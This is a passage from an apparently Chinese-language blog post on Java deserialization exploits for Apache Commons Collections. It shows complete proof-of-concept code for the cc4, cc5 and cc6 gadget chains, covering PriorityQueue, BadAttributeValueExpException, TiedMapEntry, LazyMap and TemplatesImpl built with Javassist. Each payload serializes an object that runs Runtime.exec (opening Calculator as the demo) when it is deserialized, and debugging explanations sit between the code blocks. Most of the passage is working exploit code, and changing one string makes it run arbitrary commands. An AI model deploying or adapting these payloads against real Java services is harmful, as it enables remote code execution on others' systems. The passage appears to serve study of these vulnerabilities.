class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//1.先创建恶意类</span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass tempExploitClass = pool.makeClass(<span class="string">"3xpl01t"</span>);</span><br><span class="line">        <span class="comment">//一定要设置父类，为了后续顺利</span></span><br><span class="line">        tempExploitClass.setSuperclass(pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>()))</span>;</span><br><span class="line">        <span class="comment">//写入payload，生成字节数组</span></span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\"open /Applications/Calculator.app\");"</span>;</span><br><span class="line">        tempExploitClass.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="keyword">byte</span>[] exploitBytes = tempExploitClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.new一个TemplatesImpl对象，修改tmpl类属性，为了满足后续利用条件</span></span><br><span class="line">        TemplatesImpl tmpl = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        <span class="comment">//设置_bytecodes属性为exploitBytes</span></span><br><span class="line">        Field bytecodes = TemplatesImpl.class.getDeclaredField("_bytecodes");</span><br><span class="line">        bytecodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        bytecodes.set(tmpl, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;exploitBytes&#125;);</span><br><span class="line">        <span class="comment">//一定要设置_name不为空</span></span><br><span class="line">        Field _name = TemplatesImpl.class.getDeclaredField("_name");</span><br><span class="line">        _name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _name.set(tmpl, <span class="string">"0range"</span>);</span><br><span class="line">        <span class="comment">//_class为空</span></span><br><span class="line">        Field _class = TemplatesImpl.class.getDeclaredField("_class");</span><br><span class="line">        _class.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _class.set(tmpl, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.构造chain,包装成TransformingComparator里，构造成</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(TrAXFilter<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line"><span class="class">                <span class="title">new</span> <span class="title">InstantiateTransformer</span>(</span></span><br><span class="line">                        new Class[]&#123;Templates.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[]&#123;tmpl&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        TransformingComparator iTransComparator = <span class="keyword">new</span> TransformingComparator(chain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//4.开始new一个 PriorityQueue，因为他的readObject方法是一切的开始</span></span><br><span class="line">        PriorityQueue pq = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        Object[] queueArray = <span class="keyword">new</span> Object[]&#123;tmpl, <span class="number">2</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//解封属性comparator, iTransformingComparator =&gt; _comparator</span></span><br><span class="line">        Field _comparator = PriorityQueue.class.getDeclaredField("comparator");</span><br><span class="line">        _comparator.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _comparator.set(pq, iTransComparator);</span><br><span class="line">        <span class="comment">//解封属性queue，queueArray =&gt; _queue</span></span><br><span class="line">        Field _queue = PriorityQueue.class.getDeclaredField("queue");</span><br><span class="line">        _queue.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _queue.set(pq, queueArray);</span><br><span class="line">        <span class="comment">//size修改为2</span></span><br><span class="line">        Field _size = Class.forName(<span class="string">"java.util.PriorityQueue"</span>).getDeclaredField(<span class="string">"size"</span>);</span><br><span class="line">        _size.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _size.set(pq, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>) + <span class="string">"/src/main/resources/Payload_cc4_PriorityQueue.ser"</span>)));</span><br><span class="line">            outputStream.writeObject(pq);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>) + <span class="string">"/src/main/resources/Payload_cc4_PriorityQueue.ser"</span>)));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里面在PriorityQueue处还可以有第二种写法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//4.开始new一个 PriorityQueue，因为他的readObject方法是一切的开始</span></span><br><span class="line">PriorityQueue pq = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>);</span><br><span class="line">pq.add(<span class="number">1</span>);</span><br><span class="line">pq.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//解封属性comparator, iTransformingComparator =&gt; _comparator</span></span><br><span class="line">Field _comparator = PriorityQueue.class.getDeclaredField("comparator");</span><br><span class="line">_comparator.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">_comparator.set(pq, iTransComparator);</span><br></pre></td></tr></table></figure><p>第二种为什么只提前add了两下就可以了呢？</p><p>debug一下，看第一次add：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516171058621.png" alt="image-20210516171058621"></p><p>size默认是0，所以这里属性queue[]已经赋值了第一个元素Integer(1)，size也被复制为1</p><p>第二次add：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516171416672.png" alt="image-20210516171416672"></p><p>进到siftUp看一下，我们没有给comparator赋值，所以会进入else分支：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516171513699.png" alt="image-20210516171513699"></p><p>siftUpComparator会将元素重新排序：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516171612711.png" alt="image-20210516171612711"></p><p>两次add结束之后的状态：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516171655090.png" alt="image-20210516171655090"></p><p>接下来解封comparator属性，包我们构造好的TransformingComparator借助反射赋值给它:</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516171754309.png" alt="image-20210516171754309"></p><p>最终属性：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516171933102.png" alt="image-20210516171933102"></p><p>话说回来，要是第一种，没有提前add两次赋值呢？</p><p>简短来说，那就是size和parator都没有赋值，只能再麻烦用反射去给size和queue赋值。</p><h2 id="cc5"><a href="#cc5" class="headerlink" title="cc5"></a>cc5</h2><p>条件：</p><ul><li><p><strong>commons-collections:3.1-3.2.1</strong></p></li><li><p><strong>jdk1.8</strong></p></li></ul><h3 id="利用链寻找-4"><a href="#利用链寻找-4" class="headerlink" title="利用链寻找"></a>利用链寻找</h3><p>因为jdk在1.8之后对AnnotationInvocationHandler类做了限制，所以在jdk1.8版本就必须找出能替代AnnotationInvocationHandler的新的可以利用的类，所以TiedMapEntry和BadAttributeValueExpException就被挖掘了出来。</p><p>先看cc中的TiedMapEntry的源码：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516200356238.png" alt="image-20210516200356238"></p><p>这里的map属性显然是可控的。</p><p>如果是我们熟悉的LazyMap就好了，这样就可以调用LazyMap.get方法进而触发Transformer的transform函数，执行调用链。</p><p>哪里可以调用TiedMapEntry的getValue呢？</p><p>TiedMapEntry的toString方法就可以</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516200813987.png" alt="image-20210516200813987"></p><p>那么有没有一个类可以在反序列化时触发 TiedMapEntry.toString() 呢？ BadAttributeValueExpException</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516201549257.png" alt="image-20210516201549257"></p><p>这里可以看到valObj也是从val属性拿到的，我们只要构造的时候把val属性设置为TiedMapEntry即可。</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516202426352.png" alt="image-20210516202426352"></p><p>val是private，所以这里还是得用反射去构造。</p><h3 id="最终版本PoC-6"><a href="#最终版本PoC-6" class="headerlink" title="最终版本PoC"></a>最终版本PoC</h3><p><strong>ver1</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BadAttributeValueExpException_Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Transformer[] transformers_exec = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime",null&#125;),</span><br><span class="line">                new InvokerTransformer("invoke",new Class[]&#123;Object.class, Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"open /Applications/Calculator.app"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer chain = <span class="keyword">new</span> ChainedTransformer(transformers_exec);</span><br><span class="line"></span><br><span class="line">        HashMap innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">"value"</span>,<span class="string">"abcd"</span>);</span><br><span class="line"></span><br><span class="line">        Map lazyMap = LazyMap.decorate(innerMap,chain);</span><br><span class="line">        TiedMapEntry tmap = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="number">123</span>);</span><br><span class="line">        BadAttributeValueExpException payload = <span class="keyword">new</span> BadAttributeValueExpException(<span class="number">1</span>);</span><br><span class="line">        Field val = BadAttributeValueExpException.class.getDeclaredField("val");</span><br><span class="line">        val.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        val.set(payload,tmap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc5_BadAttributeValueExpException.ser"</span>)));</span><br><span class="line">        fout.writeObject(payload);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc5_BadAttributeValueExpException.ser"</span>)));</span><br><span class="line">        <span class="comment">//服务端反序列化，触发漏洞</span></span><br><span class="line">        fin.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>慢点，这里既然提到了chain，我们可以模仿cc3来用InstantiateTransformer参与chain的构造，还有TrAXFilter：</p><p><strong>ver2</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InstantiateTransformer_Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//1.先创建恶意类</span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass tempExploitClass = pool.makeClass(<span class="string">"3xpl01t"</span>);</span><br><span class="line">        <span class="comment">//一定要设置父类，为了后续顺利</span></span><br><span class="line">        tempExploitClass.setSuperclass(pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>()))</span>;</span><br><span class="line">        <span class="comment">//写入payload，生成字节数组</span></span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\"open /Applications/Calculator.app\");"</span>;</span><br><span class="line">        tempExploitClass.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="keyword">byte</span>[] exploitBytes = tempExploitClass.toBytecode();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.new一个TemplatesImpl对象，修改tmpl类属性，为了满足后续利用条件</span></span><br><span class="line">        TemplatesImpl tmpl = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        <span class="comment">//设置_bytecodes属性为exploitBytes</span></span><br><span class="line">        Field bytecodes = TemplatesImpl.class.getDeclaredField("_bytecodes");</span><br><span class="line">        bytecodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        bytecodes.set(tmpl, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;exploitBytes&#125;);</span><br><span class="line">        <span class="comment">//一定要设置_name不为空</span></span><br><span class="line">        Field _name = TemplatesImpl.class.getDeclaredField("_name");</span><br><span class="line">        _name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _name.set(tmpl, <span class="string">"0range"</span>);</span><br><span class="line">        <span class="comment">//_class为空</span></span><br><span class="line">        Field _class = TemplatesImpl.class.getDeclaredField("_class");</span><br><span class="line">        _class.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _class.set(tmpl, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.构造chain，封装进LazyMap</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(TrAXFilter<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line"><span class="class">                <span class="title">new</span> <span class="title">InstantiateTransformer</span>(</span></span><br><span class="line">                        new Class[]&#123;Templates.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[]&#123;tmpl&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        HashMap innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        LazyMap lazymap = (LazyMap)LazyMap.decorate(innermap,chain);</span><br><span class="line">        TiedMapEntry tmap = <span class="keyword">new</span> TiedMapEntry(lazymap, <span class="number">123</span>);</span><br><span class="line">        BadAttributeValueExpException payload = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">        Field val = BadAttributeValueExpException.class.getDeclaredField("val");</span><br><span class="line">        val.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        val.set(payload,tmap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc5_InstantiateTransformer.ser"</span>)));</span><br><span class="line">        fout.writeObject(payload);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc5_InstantiateTransformer.ser"</span>)));</span><br><span class="line">        <span class="comment">//服务端反序列化，触发漏洞</span></span><br><span class="line">        fin.readObject();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>等一下，既然可以用TemplatesImpl，那么我们在cc2的TemplatesImpl版本中发现，TemplatesImpl的newTransformer会将自身的_bytecodes直接数组生成类对象，执行对象构造函数。</p><p>我们发现在TiedMapEntry的getValue中会将key参数传入，之后transform也会将key传递，所以这里我们还可以将tmpl传入TiedMapEntry的key属性，在最后也会被执行到。</p><p><strong>ver3</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TemplatesImpl_Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span>  Exception</span>&#123;</span><br><span class="line">        <span class="comment">//1.先创建恶意类</span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass tempExploitClass = pool.makeClass(<span class="string">"3xpl01t"</span>);</span><br><span class="line">        <span class="comment">//一定要设置父类，为了后续顺利</span></span><br><span class="line">        tempExploitClass.setSuperclass(pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>()))</span>;</span><br><span class="line">        <span class="comment">//写入payload，生成字节数组</span></span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\"open /Applications/Calculator.app\");"</span>;</span><br><span class="line">        tempExploitClass.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="keyword">byte</span>[] exploitBytes = tempExploitClass.toBytecode();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.new一个TemplatesImpl对象，修改tmpl类属性，为了满足后续利用条件</span></span><br><span class="line">        TemplatesImpl tmpl = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        <span class="comment">//设置_bytecodes属性为exploitBytes</span></span><br><span class="line">        Field bytecodes = TemplatesImpl.class.getDeclaredField("_bytecodes");</span><br><span class="line">        bytecodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        bytecodes.set(tmpl, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;exploitBytes&#125;);</span><br><span class="line">        <span class="comment">//一定要设置_name不为空</span></span><br><span class="line">        Field _name = TemplatesImpl.class.getDeclaredField("_name");</span><br><span class="line">        _name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _name.set(tmpl, <span class="string">"0range"</span>);</span><br><span class="line">        <span class="comment">//_class为空</span></span><br><span class="line">        Field _class = TemplatesImpl.class.getDeclaredField("_class");</span><br><span class="line">        _class.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _class.set(tmpl, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.构造InvokerTransformer</span></span><br><span class="line">        InvokerTransformer iInvokerTransformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">"newTransformer"</span>, <span class="keyword">new</span> Class[]&#123;&#125;, <span class="keyword">new</span> Object[]&#123;&#125;);</span><br><span class="line">        <span class="comment">//InvokerTransformer iInvokerTransformer = new InvokerTransformer("getOutputProperties",new Class[]&#123;&#125;,new Object[]&#123;&#125;);也可以</span></span><br><span class="line"></span><br><span class="line">        HashMap innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        LazyMap lazymap = (LazyMap)LazyMap.decorate(innermap,iInvokerTransformer);</span><br><span class="line">        TiedMapEntry tmap = <span class="keyword">new</span> TiedMapEntry(lazymap, tmpl);<span class="comment">//注意这里</span></span><br><span class="line">        BadAttributeValueExpException payload = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">        Field val = BadAttributeValueExpException.class.getDeclaredField("val");</span><br><span class="line">        val.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        val.set(payload,tmap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc5_TemplatesImpl.ser"</span>)));</span><br><span class="line">        fout.writeObject(payload);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc5_TemplatesImpl.ser"</span>)));</span><br><span class="line">        <span class="comment">//服务端反序列化，触发漏洞</span></span><br><span class="line">        fin.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="cc6"><a href="#cc6" class="headerlink" title="cc6"></a>cc6</h2><p>条件：</p><ul><li><p><strong>commons-collections:3.1-3.2.1</strong></p></li><li><p><strong>jdk1.7&amp;1.8</strong></p></li></ul><h3 id="利用链寻找-5"><a href="#利用链寻找-5" class="headerlink" title="利用链寻找"></a>利用链寻找</h3><p>CC5 用了 BadAttributeValueExpException 反序列化去触发 LazyMap.get()，除了 BadAttributeValueExpException 、AnnotationInvocationHandler 还有其他方法吗？ ysoserial告诉我们HashMap也可以！</p><p>我们再看看TiedMapEntry的内部方法hashCode：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516212156876.png" alt="image-20210516212156876"></p><p>这里也调用了getValue！</p><p>如何反序列化时触发 TiedMapEntry.hashCode() ? </p><p>ysoserial发现了HashMap的readObject方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516213000509.png" alt="image-20210516213000509"></p><p><img 